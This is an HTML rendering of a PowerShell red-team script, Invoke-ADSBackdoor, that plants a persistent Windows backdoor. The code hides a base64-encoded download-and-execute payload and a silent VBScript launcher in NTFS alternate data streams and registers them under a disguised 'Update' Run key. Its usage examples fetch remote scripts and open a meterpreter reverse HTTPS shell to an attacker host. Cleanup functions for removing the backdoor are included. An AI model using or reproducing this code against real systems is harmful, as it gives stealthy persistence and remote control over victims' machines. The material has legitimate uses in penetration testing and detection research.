<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Invoke-ADSBackdoor.ps1</title>
</head><body>function Invoke-ADSBackdoor{<br/>
&lt;#<br/>
.SYNOPSIS<br/>
Powershell Script that will use Alternate Data Streams to achieve persistence<br/>
Author: Matt Nelson (@enigma0x3)<br/>
<br/>
.DESCRIPTION<br/>
This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by <br/>
using two Alternate Data Streams. The first Alternate Data stream stores the payloadand the second Alternate Data Stream <br/>
stores some VBScript that acts as a wrapper in order to hide the DOS prompt when invoking the data stream containing the <br/>
payload. When passing the arguments, you have to include the function and any parameters required by your payload. <br/>
The arguments must also be in quotation marks.<br/>
<br/>
<br/>
.EXAMPLE<br/>
PS C:\Users\test\Desktop&gt; Invoke-ADSBackdoor -URL http://192.168.1.138/payload.ps1 -Arguments "hack"<br/>
<br/>
This will use the function "Hack" in payload.ps1 for persistence<br/>
<br/>
.EXAMPLE<br/>
<br/>
PS C:\Users\test\Desktop&gt; Invoke-ADSBackdoor -URL http://192.168.1.138/Invoke-Shellcode.ps1 -Arguments "Invoke-Shellcode<br/>
&nbsp;-Lhost 192.168.1.138 -LPort 2222 -Payload windows/meterpreter/reverse_https -Force"<br/>
<br/>
This will use the function Invoke-Shellcode in Invoke-Shellcode.ps1 to shovel meterpreter back to 192.168.1.138 on port <br/>
2222 over HTTPS. <br/>
<br/>
PowerSploit Function: Invoke-Shellcode<br/>
Author: Matthew Graeber (@mattifestation)<br/>
License: BSD 3-Clause<br/>
Required Dependencies: None<br/>
Optional Dependencies: None<br/>
<br/>
.EXAMPLE<br/>
meterpreter&gt;shell<br/>
Process 4780 created.<br/>
Channel 1 created.<br/>
Microsoft Windows [Version 6.1.7601]<br/>
Copyright (c) 2009 Microsoft Corporation. All rights reserved.<br/>
C:\&gt;powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.138/Invoke-ADSBackdoor.ps1'); Invoke-ADSBackdoor <br/>
-URL http://192.168.1.138/Invoke-Shellcode.ps1 <br/>
-Arguments 'Invoke-Shellcode -LHost 192.168.1.138 -LPort 666 -Payload windows/meterpreter/reverse_https -Force'"<br/>
<br/>
This will execute the persistence script using Invoke-Shellcode as the payload from a meterpreter session<br/>
<br/>
#&gt;<br/>
<br/>
&nbsp; &nbsp; [CmdletBinding()]<br/>
&nbsp; &nbsp; Param(<br/>
&nbsp; &nbsp; &nbsp; &nbsp;[Parameter(Mandatory=$True)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp;[string]$URL,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp;[Parameter(Mandatory=$False)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp;[String]$Arguments<br/>
&nbsp; &nbsp; )<br/>
<br/>
&nbsp; &nbsp; $TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"<br/>
&nbsp; &nbsp; $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''<br/>
&nbsp; &nbsp; $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"<br/>
&nbsp; &nbsp; $vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''<br/>
<br/>
&nbsp; &nbsp; #Store Payload<br/>
&nbsp; &nbsp; $payloadParameters = "IEX ((New-Object Net.WebClient).DownloadString('$URL')); $Arguments"<br/>
&nbsp; &nbsp; $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))<br/>
&nbsp; &nbsp; $payload = "powershell.exe -ep Bypass -noexit -enc $encodedPayload"<br/>
<br/>
&nbsp; &nbsp; #Store VBS Wrapper<br/>
&nbsp; &nbsp; $vbstext1 = "Dim objShell"<br/>
&nbsp; &nbsp; $vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"<br/>
&nbsp; &nbsp; $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($env:UserProfile\AppData:$textFile) do %i"""<br/>
&nbsp; &nbsp; $vbstext4 = "objShell.Run command, 0"<br/>
&nbsp; &nbsp; $vbstext5 = "Set objShell = Nothing"<br/>
&nbsp; &nbsp; $vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5<br/>
<br/>
&nbsp; &nbsp; #Create Alternate Data Streams for Payload and Wrapper<br/>
&nbsp; &nbsp; $CreatePayloadADS = {cmd /C "echo $payload &gt; $env:USERPROFILE\AppData:$textFile"}<br/>
&nbsp; &nbsp; $CreateWrapperADS = {cmd /C "echo $vbtext &gt; $env:USERPROFILE\AppData:$vbsFile"}<br/>
&nbsp; &nbsp; Invoke-Command -ScriptBlock $CreatePayloadADS<br/>
&nbsp; &nbsp; "Payload stored in $env:USERPROFILE\AppData:$textFile"<br/>
&nbsp; &nbsp; Invoke-Command -ScriptBlock $CreateWrapperADS<br/>
&nbsp; &nbsp; "Wrapper stored in $env:USERPROFILE\AppData:$vbsFile"<br/>
<br/>
&nbsp; &nbsp; #Persist in Registry<br/>
&nbsp; &nbsp; new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force<br/>
&nbsp; &nbsp; "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"<br/>
}<br/>
<br/>
<br/>
function Remove-ADS {<br/>
&lt;#<br/>
.SYNOPSIS<br/>
Removes an alterate data stream from a specified location.<br/>
P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.<br/>
Author: @harmj0y, @mattifestation<br/>
License: BSD 3-Clause<br/>
<br/>
.LINK<br/>
https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1<br/>
<br/>
#&gt;<br/>
&nbsp; &nbsp; [CmdletBinding()] Param(<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory=$True)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [string]$ADSPath<br/>
&nbsp; &nbsp; )<br/>
&nbsp;<br/>
&nbsp; &nbsp; #region define P/Invoke types dynamically<br/>
&nbsp; &nbsp; # &nbsp; stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1<br/>
&nbsp; &nbsp; $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')<br/>
&nbsp; &nbsp; $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)<br/>
&nbsp; &nbsp; $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)<br/>
&nbsp;<br/>
&nbsp; &nbsp; $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')<br/>
&nbsp; &nbsp; $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))<br/>
&nbsp; &nbsp; $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')<br/>
&nbsp; &nbsp; $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; @('kernel32.dll'),<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Reflection.FieldInfo[]]@($SetLastError),<br/>
&nbsp; &nbsp; &nbsp; &nbsp; @($True))<br/>
&nbsp;<br/>
&nbsp; &nbsp; # Define [Win32.Kernel32]::DeleteFile<br/>
&nbsp; &nbsp; $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'kernel32.dll',<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Reflection.CallingConventions]::Standard,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Bool],<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Type[]]@([String]),<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Runtime.InteropServices.CallingConvention]::Winapi,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Runtime.InteropServices.CharSet]::Ansi)<br/>
&nbsp; &nbsp; $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; $Kernel32 = $TypeBuilder.CreateType()<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; $Result = $Kernel32::DeleteFile($ADSPath)<br/>
<br/>
&nbsp; &nbsp; if ($Result){<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."<br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; else{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; $Result<br/>
}<br/>
<br/>
<br/>
function Remove-ADSBackdoor {<br/>
&lt;#<br/>
.SYNOPSIS<br/>
Removes the backdoor installed by Invoke-ADSBackdoor.<br/>
<br/>
.DESCRIPTION<br/>
This function will remove the persistence installed by Invoke-ADSBackdoor by parsing<br/>
the run registry run key, removing the alternate data stream files, and then<br/>
removing the registry key.<br/>
#&gt;<br/>
<br/>
&nbsp; &nbsp; # get the VBS trigger command/file location from the registry<br/>
&nbsp; &nbsp; $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Update).Update<br/>
&nbsp; &nbsp; $vbsFile = $trigger.split(" ")[1]<br/>
&nbsp; &nbsp; $getWrapperADS = {cmd /C "more &lt; &nbsp;$vbsFile"}<br/>
&nbsp; &nbsp; $wrapper = Invoke-Command -ScriptBlock $getWrapperADS<br/>
<br/>
&nbsp; &nbsp; if ($wrapper -match 'i in \((.+?)\)')<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # extract out the payload .txt file location<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $textFile = $matches[1]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if($( Remove-ADS $textFile)){<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Successfully removed payload file $textFile"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "[!] Error in removing payload file $textFile"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; else{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "[!] Error: couldn't extract PowerShell script location from VBS wrapper $vbsFile"<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; if($(Remove-ADS $vbsFile)){<br/>
&nbsp; &nbsp; &nbsp; &nbsp; "Successfully removed wrapper file $vbsFile"<br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; else{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;"[!] Error in removing payload file $textFile"<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; # remove the registry run key<br/>
&nbsp; &nbsp; Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update;<br/>
&nbsp; &nbsp; "Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'Update' key"<br/>
}<br/>
</body></html>